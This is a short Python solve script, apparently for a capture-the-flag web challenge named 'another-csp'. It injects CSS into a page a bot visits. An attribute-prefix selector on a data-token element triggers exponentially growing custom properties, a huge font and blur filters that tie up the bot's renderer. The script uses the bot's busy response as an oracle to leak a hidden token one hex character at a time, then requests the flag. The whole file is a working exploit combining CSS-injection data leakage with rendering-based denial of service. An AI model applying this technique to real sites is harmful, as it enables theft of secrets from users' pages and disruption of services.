import requests, time

HOST = "https://another-csp-162084d9ac6e20a1.mc.ax"
LENGTH = 6
CHARS = "0123456789abcdef" 

template = """
<style>
[data-token^="{{prefix}}"]::before {
  --0: attr(data-token);
  --1: var(--0)var(--0);
  --2: var(--1)var(--1);
  --3: var(--2)var(--2);
  --4: var(--3)var(--3);
  --5: var(--4)var(--4);
  --6: var(--5)var(--5);
  --7: var(--6)var(--6);
  --8: var(--7)var(--7);
  --9: var(--8)var(--8);
  --a: var(--9)var(--9);
  --b: var(--a)var(--a);
  --c: var(--b)var(--b);
  --d: var(--c)var(--c);
  --e: var(--d)var(--d);
  --f: var(--e)var(--e);
  --g: var(--f)var(--f);
  content: var(--g);
font-size: 100em;
  filter: blur(10000px) drop-shadow(1024px 1024px 1024px blue);
}
</style>
"""

def hit(c):
    for _ in range(10): 
        r = requests.get(
            f"{HOST}/bot", 
            params={
                "code": template.replace("{{prefix}}", c)
            })
        if r.status_code != 200: exit(1) 
        if "visiting" in r.text: break 
        time.sleep(1)

    time.sleep(2)
    r = requests.get(
        f"{HOST}/bot",
        params={
            "code": "c"
        })
    if r.status_code != 200: exit(1)
    return "already open!" in r.text

token = ""

for i in range(LENGTH): 
    for c in CHARS: 
        if hit(token + c): 
            token += c
            break 
    assert len(token) == i + 1
    print(token)
print("Token:",token)

r = requests.get(
    f"{HOST}/flag", 
    params={
        "token":token
    }
)
print(r.text)